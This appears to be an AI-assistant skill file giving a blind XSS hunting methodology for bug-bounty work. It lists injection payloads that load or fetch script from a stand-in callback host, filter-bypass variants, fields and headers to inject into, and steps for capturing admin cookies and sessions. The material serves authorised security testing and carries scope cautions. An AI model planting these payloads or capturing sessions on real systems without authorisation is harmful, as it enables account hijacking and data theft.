---
description: "Blind XSS hunting methodology. TRIGGER: user is planting blind XSS payloads, testing fields rendered in admin panels, support tools, log viewers, or any out-of-band JavaScript execution context they cannot directly observe."
---

# /hunt-bxss - Blind XSS Hunting

You are assisting **Liodeus (YesWeHack)**, whose blind XSS reports come from admin-panel rendering of user-controlled fields: support tickets, signup metadata, HTTP headers logged into dashboards, and webhook payloads echoed in internal tools.

## Core Philosophy

Blind XSS is a **patience + coverage** game. The payload fires hours or days later in a context you'll never see. Two rules:
1. **Plant payloads in every field that could be rendered server-side** — and do it consistently with a tagging scheme so you know which payload fired where.
2. **Use a callback you control** (XSS Hunter–style server, Burp Collaborator, Project Discovery interactsh) that captures DOM, cookies, URL, screenshot, headers — without these, a fired payload is unprovable.

## Payload Strategy

Use a tagged payload per field/endpoint so the callback tells you exactly where it fired:
```
"><script src=//xss.example.com/F-{TAG}></script>
```
Where `{TAG}` encodes endpoint + field + timestamp (e.g. `support-subject-2026-04-29`).

Always plant **multiple payload styles** in the same field (one might be filtered, another might not):
- Plain `<script>` tag
- Event handler: `"><img src=x onerror="...">`
- SVG: `<svg onload="...">`
- Attribute breakout: `' autofocus onfocus='...'`
- HTML entity / Unicode bypass variants
- JS-context: `';fetch('//xss.example.com/...');//`
- Markdown / BBCode if the field renders those: `[img]javascript:...[/img]`
- DOM-clobbering name: `<form id=test><input id=attributes>` (for AngularJS-flavored apps)

## High-Yield Fields (where bXSS fires)

### User-controlled fields rendered in admin / staff tools
* Display name, full name, company, bio, job title (rendered in user lists)
* Support ticket subject + body
* Contact form name/email/message
* Bug reports, feedback forms
* Order notes, shipping address, billing memo
* Filename of uploaded files (rendered in file-explorer admin views)
* Custom fields, tags, labels
* Profile pictures with SVG payloads (often rendered raw)
* Webhook URLs (often rendered as clickable links)

### HTTP request fields logged into dashboards
* `User-Agent` (very common — log viewers render this)
* `Referer`
* `X-Forwarded-For` (and any `X-*` header)
* Request path / query (404 logs, security event logs)
* Cookie names (rare but seen)
* Failed-login username (audit logs)

### Indirect / second-order
* Email addresses with payload in local-part: `"><script src=...>"@example.com`
* Phone numbers in fields that don't strictly validate
* Domain names submitted to whitelist forms
* Referrals / invite codes

## Discovery Methodology

### Step 1: Pick your callback infra
* XSS Hunter-style (self-hosted: xsshunter-express; or a service)
* Burp Collaborator + small JS that beacons cookies/DOM/URL
* interactsh + custom collector
Capture: DOM (outerHTML), `document.cookie`, `location.href`, `document.referrer`, screenshot, request headers, `navigator.userAgent` (to fingerprint the rendering context).

### Step 2: Inventory the input surface
Walk the app as a normal user. Every text field, every header, every webhook URL, every uploadable filename — list them. The ones that are **never echoed back to you** are the high-value bXSS candidates (because they're echoed somewhere — to staff).

### Step 3: Plant systematically
One pass per field with a tagged payload set. Move on. Don't wait.

### Step 4: Wait + correlate
Callbacks may take minutes (live admin) to weeks (quarterly review). When one fires, the tag tells you which input → which admin context. Pivot from there.

## Post-Fire: Maximize Impact

When a callback fires from an internal admin context:
1. Capture the **DOM** — what app is this? Is it Salesforce, Zendesk, custom?
2. Capture **cookies** — admin session? Use it (carefully, scope-aware) to demonstrate impact
3. Capture **internal URLs** — these reveal the internal admin domain (often great new scope)
4. Capture the admin's **roles / permissions** if visible in the DOM
5. Use the captured admin session ONLY to demonstrate read access on a benign endpoint (whoami / profile). Do not abuse — document scope and stop.

## Key Considerations

* Many programs explicitly scope OUT staff/admin accounts. Read the policy. If admin XSS is in-scope, the impact is often crit; if out-of-scope, you may still get rewarded if the bXSS proves XSS in a customer-facing context (e.g. tenant admin viewing another tenant's data).
* Never exfiltrate real admin data — capture proof-of-execution (cookie name presence, URL, fingerprint) and stop.
* Avoid noisy payloads (no `alert()`, no UI-disrupting changes) — silent beacons only.
* For SVG bXSS: upload `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile pic / file attachment — many image renderers serve SVG inline.
* If you find one bXSS, look harder at that admin tool — there are usually more sinks in the same UI.
* Tag your payloads. Untagged callbacks are useless when 50 are out at once.
